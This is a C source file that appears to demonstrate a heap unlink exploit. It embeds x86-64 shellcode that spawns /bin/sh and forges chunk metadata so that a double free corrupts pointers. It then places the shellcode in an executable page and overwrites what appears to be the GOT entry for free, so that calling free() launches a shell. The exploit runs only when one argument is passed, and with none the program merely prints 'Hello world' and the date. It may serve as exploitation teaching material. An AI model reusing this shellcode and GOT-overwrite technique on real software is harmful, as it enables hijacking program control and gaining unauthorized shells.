#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>
#include <sys/mman.h>
#include <fcntl.h>

unsigned char shell_code[] = "\x6a\x3b\x58\x99\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x52\x57\x48\x89\xe6\xb0\x3b\x0f\x05";

void vul_exe()
{
	size_t *chunk0 = (size_t *)malloc(0x80);
	size_t *chunk1 = (size_t *)malloc(0x80);
	char *shell_code_buf = (char *)malloc(0x80);
	memcpy(shell_code_buf,shell_code, strlen(shell_code));
	chunk1[0] = 0xcccc;

	free(chunk0);
	free(chunk1);

	size_t *chunk2 = (size_t *)malloc(0x110);
	chunk2[0] = 0x00;
	chunk2[1] = 0x81;
	chunk2[2] = (char *)&chunk2 - 3*8;
	chunk2[3] = (char *)&chunk2 - 2*8;

	chunk2[0x10] = 0x80;
	chunk2[0x11] = 0x90;

	free(chunk1);

/*change the memory attribute*/
	int fd;
	int alloc_size;
	char *memory;

	fd = open("/dev/zero", O_RDONLY);
	alloc_size = getpagesize();
	memory = mmap(NULL, alloc_size, PROT_WRITE, MAP_PRIVATE,fd,0);
	close(fd);
	memcpy(memory, shell_code, strlen(shell_code));
	mprotect(memory, alloc_size, PROT_READ|PROT_EXEC);
	
/*---------------------------------*/	

	// printf("free at GOT(use ):");
	// unsigned int free_addr;
	// scanf("%x",&free_addr);

	chunk2[3] = 0x602018;
	chunk2[0] = (void *)memory;

	char *tmp=NULL;
	free(tmp);
    munmap(memory, alloc_size);
}

int main(int argc, char const *argv[])
{
	if(argc == 1)
	{
		printf("Hello world!\n");
		time_t now;
		struct tm *tm_now;
		time(&now);

		tm_now = localtime(&now);
		printf("now datetime: %d-%d-%d %d:%d:%d\n",tm_now->tm_year+1900, tm_now->tm_mon+1, tm_now->tm_mday, tm_now->tm_hour, tm_now->tm_min, tm_now->tm_sec);
	}
	else if(argc == 2)
	{
		vul_exe(argv);
	}
	else
		printf("Ooooooops!\n");

	return 0;
}